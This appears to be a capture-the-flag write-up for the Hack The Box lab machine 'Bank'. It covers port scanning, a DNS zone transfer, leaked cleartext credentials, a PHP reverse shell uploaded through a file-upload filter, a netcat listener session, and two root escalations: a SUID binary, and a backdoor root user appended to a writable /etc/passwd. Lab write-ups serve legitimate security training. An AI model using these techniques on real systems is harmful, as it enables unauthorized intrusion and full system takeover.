# HTB - Bank

#### Ip: 10.10.10.29
#### Name: Bank
#### Rating: Easy

----------------------------------------------------------------------

Bank.png

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/HTB/Bank]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.29         
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 09:18 CDT
Nmap scan report for 10.10.10.29
Host is up (0.092s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

Lets enumerate further by scanning the open ports, but this time use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```text
┌──(ryan㉿kali)-[~/HTB/Bank]
└─$ sudo nmap -sC -sV -T4 10.10.10.29 -p 22,53,80       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 09:18 CDT
Nmap scan report for 10.10.10.29
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)
|   2048 b8e015482d0df0f17333b78164084a91 (RSA)
|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)
|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.27 seconds
```

Based on normal HacktheBox naming conventions, lets add bank.htb to the `/etc/hosts` file and see if we can do any type of zone transfer, seeing how DNS is open here.

Ok cool, looks like we got a few entries back from the zone transfer. Lets also add these to `/etc/hosts` before moving on to HTTP.

dns.png 

Navigating to just the IP, it looks like we've got just a default landing page for Apache.

landing.png

but if we go to bank.htb we are forwarded to bank.htb/login.php where met with a simple login:

login.php

Cool, now  that we know PHP is being used we can do some directory busting, and make sure to include fuxxing for .php pages as well.

directory.png

Note: I had to include the `--filter-status 404` flag because I was getting so many 404 errors, and I just like to use the `-q`  (quiet) flag to bypass any graphics and keep my screenshots more tidy.

Cool, we found some interesting directories. `/balance-transfer` seems especially interesting.

In the `/balance-transfer` directory we find a large number of .acc files:

bt.png

We can download these files and they appear to have hashed user information, including credentials:

dl.png

Looking at the size of these files they all appear to be somewhere between 580-585, but if we sort them by their size rather than by name, we find one that is considerably smaller:

size.png

Downloading this file we can see why it is so much smaller than the others. Looks like we've got an Encryption Failed error message, and this user's data was stored in clear-text.

chris.png

Great, we can use these credentials to login to the site:

chris_login.png

### Exploitation

Navigating around the site, we find a File Upload feature in the support page.

support.png

After having a hard time getting anything to load succesfully, I take a look at the page source and find a super interesting comment left behind:

htb.png

Now that's interesting. Because we know the site is using PHP, lets grab a copy of PentestMonkey's php-reverse-shell.php and rename it as shell.htb.

First, we'll need to update the script with our correct IP adress and the port we'll listen on:

php-rev.png

We can then upload the file:

success.png

Recalling the `/uploads` directory discovered earlier, we can trigger the shell by navigating to bank.htb/uploads/shell.htb

And catch a shell back as www-data:

```text
┌──(ryan㉿kali)-[~/HTB/Bank]
└─$ nc -lnvp 443                 
listening on [any] 443 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.29] 46908
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 i686 i686 GNU/Linux
 18:29:18 up 23:07,  0 users,  load average: 0.00, 0.03, 0.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
bank
```

After stabilizing the shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'
` we can grab the user.txt flag:

user_flag.png

From here I'll transfer over linpeas for further enumeration of a privilege escalation vector:

lp_tranfer.png

### Privilege Escalation #1

Linpeas finds `/var/htb/bin/emergency` which in an unkown SUID binary (these are almost always worth investigating..)

suid.png

Doing just a little more recon on the file, I see it is owned by root and I can execute it. Now I can simply run it and instantly drop into a root shell:

```text
www-data@bank:/tmp$ file /var/htb/bin/emergency
/var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
www-data@bank:/tmp$ ls -la /var/htb/bin/emergency
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
www-data@bank:/tmp$ cd /var/htb/bin
www-data@bank:/var/htb/bin$ ls
emergency
www-data@bank:/var/htb/bin$ ./emergency
# whoami
root
# hostname
bank
```

From here I can grab the root.txt flag:

root_flag.png

### Privilege Escalation #2

Linpeas also finds that the `/etc/passwd` file is writable. This lets us essentially give ourselves the keys to the kingdom! Lets add user root2 with root permissions:

passwd_write.png

```text
www-data@bank:/var/htb/bin$ openssl passwd password123
Warning: truncating password to 8 characters
uE5rNVxNCU7r2
< echo "root2:uE5rNVxNCU7r2:0:0:root:/root:/bin/bash" >> /etc/passwd          
www-data@bank:/var/htb/bin$ su root2
Password: 
root@bank:/var/htb/bin# whoami
root
root@bank:/var/htb/bin# hostname
bank
```
And that's that! Thanks for following along!

-Ryan

---------------------------------------------

